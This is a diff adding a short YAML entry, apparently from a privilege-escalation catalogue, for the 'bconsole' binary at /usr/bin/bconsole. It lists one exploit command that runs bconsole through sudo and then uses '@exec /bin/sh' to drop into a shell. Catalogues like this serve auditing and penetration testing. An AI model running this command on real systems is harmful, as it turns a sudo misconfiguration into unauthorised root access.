@@ -1,0 +1,4 @@
+name: bconsole
+binary_path: /usr/bin/bconsole
+exploit_cmds:
+- sudo /usr/bin/bconsole && @exec /bin/sh
